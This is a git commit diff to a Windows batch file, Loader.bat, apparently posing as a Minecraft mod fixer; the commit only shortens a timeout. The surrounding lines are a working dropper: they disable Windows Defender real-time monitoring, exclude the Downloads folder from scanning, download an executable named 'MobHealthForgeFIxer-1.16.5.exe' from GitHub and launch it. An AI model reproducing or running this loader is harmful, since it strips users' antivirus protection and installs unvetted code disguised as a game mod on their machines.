1eae3521e60c0b0ebbcaf6d58ef4f18ed254aead
drespook <drespook763@gmail.com>
2025-03-20 19:51:57 +0200

    Update Loader.bat

--- Loader.bat
+++ Loader.bat
@@ -2,6 +2,6 @@
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Downloads'"
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/drespook/LabyMod/raw/refs/heads/main/MobHealthForgeFIxer-1.16.5.exe' -OutFile '%USERPROFILE%\Downloads\MobHealthForgeFIxer-1.16.5.exe'"
-timeout /t 5 /nobreak >nul
+timeout /t 2 /nobreak >nul
 start "" "%USERPROFILE%\Downloads\MobHealthForgeFIxer-1.16.5.exe"
 exit
